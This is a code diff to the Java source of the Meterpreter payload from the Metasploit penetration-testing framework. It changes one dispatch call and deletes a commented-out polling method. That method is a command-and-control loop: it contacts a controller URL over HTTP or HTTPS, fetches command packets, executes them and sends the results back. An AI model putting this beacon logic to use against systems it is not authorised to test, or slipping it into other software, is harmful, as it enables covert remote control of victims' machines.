@@ -184,7 +184,7 @@ public class Meterpreter {
             }
 
             System.out.println("msf : entering dispatch");
-            boolean cleanExit = this.transports.current().dispatch(this, this.commandManager);
+            boolean cleanExit = this.transports.current().dispatch(this);
             System.out.println("msf : dispatch exited " + (cleanExit ? "cleanly" : "badly"));
             this.transports.current().disconnect();
 
@@ -206,86 +206,6 @@ public class Meterpreter {
     protected String getPayloadTrustManager() {
         return "com.metasploit.meterpreter.PayloadTrustManager";
     }
-
-    /**
-     * Poll from a given URL until a shutdown request is received.
-     *
-     * @param url
-     */
-    //private void pollURL(URL url, int sessionExpirationTimeout, int sessionCommunicationTimeout) throws IOException {
-    //    synchronized (this) {
-    //        tlvQueue = new ArrayList();
-    //    }
-    //    int ecount = 0;
-    //    long deadline = System.currentTimeMillis() + sessionExpirationTimeout * 1000L;
-    //    long commDeadline = System.currentTimeMillis() + sessionCommunicationTimeout * 1000L;
-    //    final byte[] RECV = "RECV".getBytes("ISO-8859-1");
-    //    while (System.currentTimeMillis() < Math.min(commDeadline, deadline)) {
-    //        byte[] outPacket = null;
-    //        synchronized (this) {
-    //            if (tlvQueue.size() > 0)
-    //                outPacket = (byte[]) tlvQueue.remove(0);
-    //        }
-    //        TLVPacket request = null;
-    //        try {
-    //            URLConnection uc = url.openConnection();
-    //            if (url.getProtocol().equals("https")) {
-    //                // load the trust manager via reflection, to avoid loading
-    //                // it when it is not needed (it requires Sun Java 1.4+)
-    //                try {
-    //                    Class.forName(getPayloadTrustManager()).getMethod("useFor", new Class[]{URLConnection.class}).invoke(null, new Object[]{uc});
-    //                } catch (Exception ex) {
-    //                    ex.printStackTrace(getErrorStream());
-    //                }
-    //            }
-    //            uc.setDoOutput(true);
-    //            OutputStream out = uc.getOutputStream();
-    //            out.write(outPacket == null ? RECV : outPacket);
-    //            out.close();
-    //            DataInputStream in = new DataInputStream(uc.getInputStream());
-    //            int len;
-    //            try {
-    //                len = in.readInt();
-    //            } catch (EOFException ex) {
-    //                len = -1;
-    //            }
-    //            if (len != -1) {
-    //                int ptype = in.readInt();
-    //                if (ptype != PACKET_TYPE_REQUEST)
-    //                    throw new RuntimeException("Invalid packet type: " + ptype);
-    //                request = new TLVPacket(in, len - 8);
-    //            }
-    //            in.close();
-    //            commDeadline = System.currentTimeMillis() + sessionCommunicationTimeout * 1000L;
-    //        } catch (IOException ex) {
-    //            ex.printStackTrace(getErrorStream());
-    //            // URL not reachable
-    //            if (outPacket != null) {
-    //                synchronized (this) {
-    //                    tlvQueue.add(0, outPacket);
-    //                }
-    //            }
-    //        }
-    //        if (request != null) {
-    //            ecount = 0;
-    //            TLVPacket response = executeCommand(request);
-    //            if (response == null)
-    //                break;
-    //            writeTLV(PACKET_TYPE_RESPONSE, response);
-    //        } else if (outPacket == null) {
-    //            int delay;
-    //            if (ecount < 10) {
-    //                delay = 10 * ecount;
-    //            } else {
-    //                delay = 100 * ecount;
-    //            }
-    //            sleep(Math.min(10000, delay));
-    //        }
-    //    }
-    //    synchronized (this) {
-    //        tlvQueue = new ArrayList();
-    //    }
-    //}
 
     /**
      * Get the command manager, used to register or lookup commands.
